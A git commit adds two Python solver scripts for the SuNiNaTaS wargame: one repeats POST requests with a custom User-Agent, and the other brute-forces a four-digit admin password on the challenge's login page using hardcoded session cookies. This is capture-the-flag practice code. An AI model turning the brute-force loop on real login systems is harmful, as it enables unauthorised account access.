fc0303977c374b65fa560fefe15ae18a56290f54
Persian <71588693+Jun-Project-LAB@users.noreply.github.com>
2020-11-12 11:42:04 +0900

    SuninaTas

---
+++ wargame/Python/SuninaTas_4.py
@@ -0,0 +1,26 @@
+import requests as req
+
+URL = "http://suninatas.com/challenge/web04/web04_ck.asp"
+#Define Destination URL
+
+cookies = {"ASPSESSIONIDCQCAQARC":"IBAIEAKBONBABMLEAKMEAJBF", "ASP.NET_SessionId":"r0t5uuobdpqluvd4k112cs2y", "_gid":"GA1.2.156625606.1605051663", "_ga":"GA1.2.416738295.1605051663"}
+#Define Cookie for Login Session. The Value is Will be change when ever login
+
+headers = req.utils.default_headers()
+#Get Header Define Custom header
+
+headers.update({'User-Agent':'SuNiNaTaS', })
+#Add the Value at the header
+
+
+for a in range(25):
+    response = req.post(URL, cookies=cookies)
+    print(response.status_code)
+    print(a)
+#Keep Request 25 times Use Default Headers
+
+for a in range(25):
+    response = req.post(URL, cookies=cookies, headers=headers)
+    print(response.status_code)
+    print(a)
+#Keep Request 25 time Use Custom Headers
---
+++ wargame/Python/SuninaTas_8.py
@@ -0,0 +1,24 @@
+import requests as req
+
+URL = "http://suninatas.com/challenge/web08/web08.asp"
+#Define Destination URL
+
+cookies = {"ASPSESSIONIDSSRQBBSD":"GCEHENDCLHKPBICOFCOKGPIE", "ASP.NET_SessionId":"4yapkv0m1fvilqkdhmyl0twe", "_gid":"GA1.2.156625606.1605051663", "_ga":"GA1.2.416738295.1605051663"}
+#Define Cookies for Login Session. The Value is Change whenever you login.
+
+params = {"id":"admin"}
+#Define POST Value for Login
+
+for a in range(10000):
+#Try to 9999 from 0
+    params["pw"]=str(a).zfill(4)
+#Insert the pw Value 4 Digits Type
+    response = req.post(URL, cookies=cookies, params=params)
+#Trying Login
+    if response.text.find("Password Incorrect") == -1:
+#If String is Can't Find, that is correct Password
+        print("Password is {}".format(params["pw"]))
+        break
+#print Correct Password Value and break for statement
+    response.close()
+#Close TCP Session for next Session
